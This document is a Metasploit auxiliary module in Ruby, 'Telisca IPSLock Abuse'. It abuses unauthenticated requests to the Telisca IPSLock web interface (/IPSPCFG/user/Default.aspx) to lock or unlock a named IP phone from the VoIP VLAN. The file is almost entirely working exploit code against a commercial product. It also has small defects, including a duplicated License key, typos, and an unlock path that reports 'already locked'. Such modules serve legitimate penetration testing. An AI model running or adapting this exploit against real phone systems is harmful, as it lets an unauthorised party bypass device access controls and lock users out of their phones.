##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
 
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Telisca IPSLock Abuse',
      'Description'    => %q{This modules will exploit the vulnerabilities of Telisca IPSLock , in order to lock/unlock IP Phones.  you need to be in the voip vlan and you have to  know the phone name example : SEP002497AB1D4B .  Set ACTION to either LOCK or UNLOCK UNLOCK is the default.},
      'References'     =>
       [
       ],
      'Author'         =>
       [
         'Fakhir Karim Reda <karim.fakhir[at]gmail.com>',
         'zirsalem'
       ], 'License'        => MSF_LICENSE,
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Dec 17 2015",
      'Actions'     =>
       [
         ['LOCK'],
         ['UNLOCK']
       ],
    ))
    register_options(
      [
        OptString.new('PHONENAME', [true, 'The name of the victim phone ex SEP002497AB1D4B ']),
        OptString.new('RHOST', [true, 'The IPSLock IP Address']),
        OptString.new('ACTION', [true, 'LOCK OR UNLOCK','LOCK']),
      ], self.class)
    deregister_options('RHOSTS')
 end

  def port_open?
    begin
      res = send_request_raw({'method' => 'GET', 'uri' => '/'}, datastore['TIMEOUT'])
      return true if res
    rescue ::Rex::ConnectionRefused
      vprint_status("#{peer} - Connection refused")
      return false
    rescue ::Rex::ConnectionError
      vprint_error("#{peer} - Connection failed")
      return false
    rescue ::OpenSSL::SSL::SSLError
      vprint_error("#{peer} - SSL/TLS connection error")
      return false
    end
  end

  #
  # Lock a phone .  Function returns true or false
  #
  def lock(phone_name,ips_ip)
    sid = ''
    begin
      res = send_request_cgi({
        'method'    => 'GET',
        'uri'       => '/IPSPCFG/user/Default.aspx',
        'vars_get' => {
          'action'  => 'DO',
          'tg' => 'L',
          'pn'       => phone_name,
          'dp'   => '',
          'gr'   => '',
          'gl'   => ''
       }
      })
      if res and res.code == 200
        if  res.body.include? "Unlock" or res.body.include? "U7LCK"
          print_good("The deivice  #{phone_name} is already locked")
        elsif  res.body.include? "unlocked"  or res.body.include? "Locking"  or res.body.include? "QUIT"
          print_good("Deivice #{phone_name} successfully locked")
        end
      else
        print_error("Lock Request Error #{res.code}")
        return nil
      end
    rescue ::Exception => e
      print_error("Error: #{e.to_s}")
      return nil
    end
    return false
 end
  
  #
  # Unlock a phone .  Function returns true or false
  #
  def unlock(phone_name,ips_ip)
    begin
      res = send_request_cgi({
        'method'    => 'GET',
        'uri'       => '/IPSPCFG/user/Default.aspx',
        'headers'   => {
          'Connection' => 'keep-alive',
          'Accept-Language' => 'en-US,en;q=0.5'
        },
        'vars_get' => {
          'action'  => 'U7LCK',
          'pn'       => phone_name,
          'dp'   => ''
        }
      })
      if res and res.code == 200
        if  res.body.include? "Unlock" or res.body.include? "U7LCK"
          print_good("The device  #{phone_name} is already locked")
          return true
        elsif  res.body.include? "unlocked"  or res.body.include? "QUIT"
          print_good("The device #{phone_name} successfully unlocked")
          return true
        end
     else
       print_error("UNLOCK Request Error #{res.code}")
       return nil
     end
    rescue ::Exception => e
      print_error("Error: #{e.to_s}")
      return nil
    end
    return nil
  end
  def run
    if not port_open?
      print_error("The web server is unreachable !")
      return
    end
    phone_name = datastore['PHONENAME']
    ipsserver = datastore['RHOST']
    case action.name
      when 'LOCK'
        res = lock(phone_name,ipsserver)
      when 'UNLOCK'
        res = unlock(phone_name,ipsserver)
    end
  end
end
